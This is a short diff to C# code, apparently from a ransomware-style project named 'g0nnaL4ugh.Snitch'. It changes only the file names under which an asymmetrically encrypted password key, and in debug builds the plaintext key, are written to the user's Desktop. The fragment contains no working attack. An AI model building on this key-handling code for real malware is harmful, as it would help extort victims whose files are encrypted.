@@ -14,7 +14,7 @@ namespace g0nnaL4ugh.Snitch
             byte[] asymEncrypted = encrypter.AsymEncryptBytes(pwdBytes);
             Writter.WriteBytes2File(asymEncrypted,
                                     Path.Combine(pathUtil.Desktop,
-			                                     "key.enc.txt"));
+			                                     "key.enc.text"));
         }
 
 #if DEBUG      
@@ -28,7 +28,7 @@ namespace g0nnaL4ugh.Snitch
 			                        Path.Combine(pathUtil.Desktop, "key.enc.txt"));*/
 			Writter.WriteBytes2File(pwdBytes,
                                     Path.Combine(pathUtil.Desktop,
-			                                     "key.txt"));
+			                                     "key.text"));
         }
 #endif
     }
